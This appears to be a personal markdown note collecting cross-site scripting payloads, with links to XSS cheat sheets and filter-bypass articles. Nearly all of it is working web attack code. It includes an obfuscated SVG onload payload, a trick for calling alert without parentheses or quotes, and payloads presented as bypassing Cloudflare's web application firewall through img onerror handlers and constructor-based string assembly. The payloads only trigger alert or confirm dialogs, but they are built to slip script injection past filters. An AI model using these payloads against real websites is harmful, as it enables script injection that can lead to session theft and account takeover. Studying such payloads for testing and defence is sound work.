
![[Pasted image 20241018173908.png]]

```
<sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
```


> [!TIP]
```
alert() with no parenthesis, back ticks, brackets, quotes, braces, etc. by

[@stealthybugs](https://x.com/stealthybugs)

a=8,b=confirm,c=window,c.onerror=b;throw-a
```


# WAF Bypass

##### CLOUDFLARE
(https://x.com/XssPayloads/status/1465168176266846209)
```
<img/src=x onError="`${x}`;alert(`Ex.Mi`);">
```

```
onerror="x='ale';z='r';y='t';p='`XSS`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`
```


[==UPPER CASE FILTER EXISTS?==](https://master-sec.medium.com/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)

["'()[]\%; FILTER EXISTS?](https://ibb.co/5krL3sv)







> [!IMPORTANT]
https://tinyxss.terjanq.me/
https://gbhackers.com/top-500-important-xss-cheat-sheet/
https://web.archive.org/web/20200831091720/https://ghostbin.co/paste/qo23j
https://x.com/xsspayloads